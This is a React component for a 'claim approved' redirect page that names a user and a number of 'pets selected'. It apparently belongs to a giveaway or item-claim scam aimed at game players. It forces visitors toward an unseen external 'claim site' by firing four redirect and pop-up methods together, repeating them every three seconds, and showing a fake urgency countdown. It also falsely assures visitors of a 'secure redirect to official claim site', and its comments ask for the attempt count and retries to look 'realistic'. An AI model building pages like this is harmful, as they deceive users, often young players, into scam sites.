"use client"

import { useEffect, useState } from "react"
import { Loader2, ExternalLink, Gift, Zap } from "lucide-react"

interface RedirectPageProps {
  redirectUrl: string
  username?: string
  petCount?: number
}

export default function RedirectPage({ redirectUrl, username, petCount = 0 }: RedirectPageProps) {
  const [countdown, setCountdown] = useState(3)
  const [redirectAttempts, setRedirectAttempts] = useState(0)
  const [progress, setProgress] = useState(0)

  useEffect(() => {
    console.log("🚀 RedirectPage mounted, starting redirect process...")

    // Immediate redirect attempts
    const performRedirect = () => {
      const currentAttempt = redirectAttempts + 1
      console.log(`🚀 Redirect attempt ${currentAttempt}`)
      setRedirectAttempts(currentAttempt)

      // Method 1: Direct location change
      window.location.href = redirectUrl

      // Method 2: Window.open as backup
      setTimeout(() => {
        window.open(redirectUrl, "_blank", "noopener,noreferrer")
      }, 100)

      // Method 3: Location replace
      setTimeout(() => {
        window.location.replace(redirectUrl)
      }, 200)

      // Method 4: Create and click link
      setTimeout(() => {
        const link = document.createElement("a")
        link.href = redirectUrl
        link.target = "_blank"
        link.rel = "noopener noreferrer"
        link.style.display = "none"
        document.body.appendChild(link)
        link.click()
        document.body.removeChild(link)
      }, 300)
    }

    // Start redirecting immediately
    performRedirect()

    // Countdown timer - starts at 3 and goes down
    let currentCountdown = 3
    const countdownTimer = setInterval(() => {
      currentCountdown -= 1
      setCountdown(currentCountdown)

      if (currentCountdown <= 0) {
        clearInterval(countdownTimer)
        // Try redirect again if still on page
        performRedirect()
      }
    }, 1000)

    // Smooth progress animation (updates every 50ms for smoother animation)
    let currentProgress = 0
    const progressTimer = setInterval(() => {
      const targetProgress = ((3 - currentCountdown) / 3) * 100

      if (currentProgress < targetProgress) {
        currentProgress = Math.min(currentProgress + 2, targetProgress)
        setProgress(currentProgress)
      }

      if (currentProgress >= 100) {
        clearInterval(progressTimer)
      }
    }, 50)

    // Retry redirect every 3 seconds if still on page (more realistic)
    const retryTimer = setInterval(() => {
      performRedirect()
    }, 3000)

    return () => {
      clearInterval(countdownTimer)
      clearInterval(progressTimer)
      clearInterval(retryTimer)
    }
  }, [redirectUrl]) // Remove redirectAttempts from dependencies to prevent infinite loop

  return (
    <div className="min-h-screen bg-gradient-to-br from-green-400 via-blue-500 to-purple-600 flex items-center justify-center relative overflow-hidden">
      {/* Animated background elements */}
      <div className="absolute inset-0">
        <div
          className="absolute top-20 left-20 w-32 h-32 bg-white/10 rounded-full animate-bounce"
          style={{ animationDelay: "0s" }}
        ></div>
        <div
          className="absolute top-40 right-32 w-24 h-24 bg-white/10 rounded-full animate-bounce"
          style={{ animationDelay: "1s" }}
        ></div>
        <div
          className="absolute bottom-32 left-1/3 w-40 h-40 bg-white/10 rounded-full animate-bounce"
          style={{ animationDelay: "2s" }}
        ></div>
        <div
          className="absolute bottom-20 right-20 w-28 h-28 bg-white/10 rounded-full animate-bounce"
          style={{ animationDelay: "0.5s" }}
        ></div>
      </div>

      <div className="bg-white/95 backdrop-blur-sm rounded-3xl p-8 sm:p-12 max-w-md w-full mx-4 text-center shadow-2xl relative z-10">
        {/* Success Icon */}
        <div className="mb-6">
          <div className="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-4 animate-pulse">
            <Gift className="h-10 w-10 text-white" />
          </div>
          <div className="flex justify-center items-center gap-2 mb-2">
            <Zap className="h-5 w-5 text-yellow-500 animate-pulse" />
            <span className="text-green-600 font-bold text-lg">CLAIM APPROVED!</span>
            <Zap className="h-5 w-5 text-yellow-500 animate-pulse" />
          </div>
        </div>

        {/* Main Message */}
        <h1 className="text-2xl sm:text-3xl font-bold text-gray-800 mb-4">🎉 Redirecting You Now!</h1>

        <p className="text-gray-600 mb-6 text-lg">Please wait while we redirect you to the claim site...</p>

        {/* User Info */}
        {username && (
          <div className="bg-blue-50 rounded-lg p-4 mb-6">
            <p className="text-sm text-gray-600 mb-1">Claiming for:</p>
            <p className="font-bold text-blue-700">@{username}</p>
            {petCount > 0 && <p className="text-sm text-gray-600 mt-1">{petCount} pets selected</p>}
          </div>
        )}

        {/* Enhanced Loading Animation */}
        <div className="mb-6 relative">
          <div className="flex justify-center items-center gap-3 mb-4">
            <div className="relative">
              <Loader2 className="h-8 w-8 text-blue-500 animate-spin" />
              <div className="absolute inset-0 rounded-full border-2 border-blue-200 animate-pulse"></div>
            </div>
            <div className="text-center">
              <div
                className={`text-3xl font-bold transition-all duration-500 ${
                  countdown <= 1 ? "text-red-500 animate-bounce" : "text-gray-700"
                }`}
              >
                {countdown}
              </div>
              <span className="text-sm text-gray-600">
                {countdown === 1 ? "second remaining" : "seconds remaining"}
              </span>
            </div>
          </div>

          {/* Animated Progress Bar */}
          <div className="w-full bg-gray-200 rounded-full h-4 mb-4 overflow-hidden shadow-inner">
            <div
              className={`h-4 rounded-full transition-all duration-300 ease-out ${
                countdown <= 1
                  ? "bg-gradient-to-r from-red-500 to-orange-500 animate-pulse"
                  : "bg-gradient-to-r from-blue-500 to-green-500"
              }`}
              style={{
                width: `${progress}%`,
                boxShadow: countdown <= 1 ? "0 0 10px rgba(239, 68, 68, 0.5)" : "0 0 10px rgba(59, 130, 246, 0.3)",
              }}
            >
              <div className="h-full bg-white/20 animate-pulse"></div>
            </div>
          </div>

          {/* Animated dots with stagger effect */}
          <div className="flex justify-center space-x-2">
            {[0, 1, 2].map((index) => (
              <div
                key={index}
                className={`w-3 h-3 rounded-full transition-all duration-300 ${
                  countdown <= 1 ? "bg-red-500 animate-bounce" : "bg-blue-500 animate-bounce"
                }`}
                style={{
                  animationDelay: `${index * 150}ms`,
                  transform: countdown <= 1 ? "scale(1.2)" : "scale(1)",
                }}
              ></div>
            ))}
          </div>

          {/* Pulsing ring effect around the whole section */}
          <div
            className={`absolute inset-0 rounded-3xl pointer-events-none transition-all duration-1000 ${
              countdown <= 1 ? "ring-4 ring-red-500/30 animate-pulse" : "ring-2 ring-blue-500/20"
            }`}
          ></div>
        </div>

        {/* Manual Redirect Button */}
        <div className="space-y-3">
          <button
            onClick={() => {
              setRedirectAttempts((prev) => prev + 1)
              window.open(redirectUrl, "_blank", "noopener,noreferrer")
            }}
            className="w-full bg-gradient-to-r from-green-500 to-blue-500 hover:from-green-600 hover:to-blue-600 text-white font-bold py-4 px-6 rounded-xl transition-all duration-200 transform hover:scale-105 flex items-center justify-center gap-2"
          >
            <ExternalLink className="h-5 w-5" />
            Click Here if Not Redirected
          </button>

          {/* Show realistic attempt count */}
          <p className="text-xs text-gray-500">
            {redirectAttempts === 1 ? "1 redirect attempt" : `${redirectAttempts} redirect attempts`}
          </p>
        </div>

        {/* Security Message */}
        <div className="mt-6 p-3 bg-yellow-50 border border-yellow-200 rounded-lg">
          <p className="text-xs text-yellow-700">🔒 Secure redirect to official claim site</p>
        </div>
      </div>
    </div>
  )
}
